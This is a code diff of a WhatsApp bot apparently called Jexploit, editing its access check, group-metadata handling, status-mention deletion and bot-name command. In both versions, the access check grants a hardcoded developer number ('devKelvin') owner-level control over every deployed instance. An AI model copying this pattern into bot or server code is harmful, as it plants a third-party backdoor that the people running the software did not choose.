@@ -145,27 +145,25 @@ const botNumber = await conn.decodeJid(conn.user.id)
 
 async function checkAccess(sender) {
     try {
+        // Normalize the sender number
         const normalizedSender = sender.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
         
         const sudoUsers = await db.getSudo(botNumber) || [];
+        
         const owners = await db.get(botNumber, 'owners', []);
-        
-        const devKelvinJid = devKelvin.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        
         const authorizedNumbers = [
             botNumber,
-            devKelvinJid, 
+            devKelvin,
             ...owners,
             ...sudoUsers
         ]
-        .filter(num => num)
+        .filter(num => num) 
         .map(num => {
             if (!num) return null;
             const cleanNum = num.replace(/[^0-9]/g, "");
             return cleanNum ? cleanNum + "@s.whatsapp.net" : null;
         })
-        .filter(num => num);
-        
+        .filter(num => num); 
         return authorizedNumbers.includes(normalizedSender);
     } catch (error) {
         console.error('Error in checkAccess:', error);
@@ -228,31 +226,6 @@ const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('vie
 const senderNumber = m.sender.split('@')[0];
 
 
-let groupMetadata = null;
-let groupName = "";
-let participants = [];
-let groupAdmins = [];
-let isBotAdmins = false;
-let groupOwner = "";
-let isGroupOwner = false;
-let isGroupAdmins = false;
-
-// Only fetch group metadata if it's a group message
-if (m.isGroup) {
-    try {
-        groupMetadata = await conn.groupMetadata(m.chat);
-        groupName = groupMetadata?.subject || "";
-        participants = groupMetadata?.participants || [];
-        groupAdmins = await getGroupAdmins(participants);
-        isBotAdmins = groupAdmins.includes(botNumber);
-        groupOwner = groupMetadata?.owner || "";
-        isGroupOwner = (groupOwner ? groupOwner : groupAdmins).includes(m.sender);
-        isGroupAdmins = groupAdmins.includes(m.sender);
-    } catch (error) {
-        // Silently handle metadata fetch errors - don't spam console
-        // These often happen during connection issues or rate limits
-    }
-}
 
 const peler = fs.readFileSync('./start/lib/Media/Jexploit.jpg')
 const cina = fs.readFileSync('./start/lib/Media/Jex.jpg')
@@ -557,11 +530,10 @@ if (m.isGroup && body && !m.key.fromMe) {
 }
 
 if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
-    
-    if (!m.isAdmin) {
-        await conn.deleteMessage(m.chat, m.key).catch(() => {});
-    }
-  
+    // Don't delete bot's own messages
+    if (m.key.fromMe) return;
+    if (m.isAdmin) return;
+    await conn.deleteMessage(m.chat, m.key).catch(() => {});
 }
 
 // ========== ANTI-DELETE EXECUTION ==========
@@ -1031,39 +1003,7 @@ case "setownername": {
         console.error('Error in setownername command:', error);
         reply('❌ *Failed to update owner name.* Please try again.');
     }
-    break;
-}
-case "setbotname": {
-    if (!Access) return reply(mess.owner);
     
-    if (!text) {
-        const currentName = await db.get(botNumber, 'botname', 'Not set');
-        return reply(`*SET BOT NAME*\n\n*Usage:* ${prefix}setbotname [new name]\n*Example:* ${prefix}setbotname Jexploit Pro\n\n*Current bot name:* ${currentName}`);
-    }
-
-    try {
-        // Validate name length
-        if (text.length > 25) {
-            return reply('❌ *Bot name too long!* Maximum 25 characters allowed.');
-        }
-        
-        if (text.length < 2) {
-            return reply('❌ *Bot name too short!* Minimum 2 characters required.');
-        }
-
-        // Set the new bot name in SQLite
-        await db.set(botNumber, 'botname', text.trim());
-
-        // Update global for current session
-        global.botname = text.trim();
-
-        reply(`✅ Bot name set to: ${text.trim()}`);
-
-    } catch (error) {
-        console.error('Error in setbotname command:', error);
-        reply('❌ *Failed to update bot name.* Please try again.');
-    }
-    break;
 }
 break
 case 'cekidch': case 'idch': {
